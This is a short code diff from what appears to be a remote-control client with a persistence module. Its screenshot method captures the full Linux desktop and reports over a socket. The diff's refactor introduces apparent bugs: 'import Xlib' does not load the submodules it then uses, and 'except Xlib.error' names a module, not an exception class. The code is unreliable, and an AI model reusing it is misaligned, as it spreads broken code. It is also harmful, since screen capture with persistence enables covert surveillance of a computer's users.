@@ -17,7 +17,7 @@ from src import helper, errors
 from src.definitions import platforms
 
 if platforms.OS == platforms.LINUX:
-    from Xlib import display, X
+    import Xlib
 
 if platforms.OS in [platforms.DARWIN, platforms.LINUX]:
     from src.client.persistence.unix import Unix as Persistence
@@ -95,18 +95,18 @@ class Control(metaclass=abc.ABCMeta):
     def screenshot(self):
         if platforms.OS == platforms.LINUX:
             try:
-                dsp = display.Display()
+                dsp = Xlib.display.Display()
 
                 root = dsp.screen().root
                 desktop = root.get_geometry()
                 w = desktop.width
                 h = desktop.height
 
-                raw_byt = root.get_image(0, 0, w, h, X.ZPixmap, 0xffffffff)
+                raw_byt = root.get_image(0, 0, w, h, Xlib.X.ZPixmap, 0xffffffff)
                 image = Image.frombuffer("RGB", (w, h), raw_byt.data, "raw", "BGRX")
 
                 dsp.close()
-            except Exception as e:
+            except Xlib.error as e:
                 self.socket.send(ERROR, str(e))
                 return
         else:
